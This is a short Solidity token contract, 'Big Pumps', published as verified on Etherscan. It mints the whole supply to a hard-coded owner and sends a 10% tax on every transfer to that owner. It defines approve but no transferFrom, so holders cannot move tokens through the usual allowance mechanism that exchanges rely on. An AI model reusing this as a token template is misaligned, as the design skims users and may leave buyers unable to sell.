/**
 *Submitted for verification at Etherscan.io on 2023-06-23
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract BigPumps {
    string public name = "Big Pumps";
    string public symbol = "PUMPS";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000 * (10 ** uint256(decimals));
    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = 0x2A16e912CC045F5883d8f80dE3Aa7332b2965aE2;
        balanceOf[owner] = totalSupply;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(to != address(0), "Invalid address");

        uint256 senderBalance = balanceOf[msg.sender];
        require(senderBalance >= value, "Insufficient balance");

        uint256 taxAmount = calculateTax(value);
        uint256 transferAmount = value - taxAmount;

        balanceOf[msg.sender] = senderBalance - value;
        balanceOf[to] += transferAmount;
        balanceOf[owner] += taxAmount;

        emit Transfer(msg.sender, to, transferAmount);
        emit Transfer(msg.sender, owner, taxAmount);
        return true;
    }

    function calculateTax(uint256 amount) internal pure returns (uint256) {
        return amount * 10 / 100; // 10% tax
    }

    function approve(address spender, uint256 value) external returns (bool) {
        require(spender != address(0), "Invalid address");

        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true;
    }
}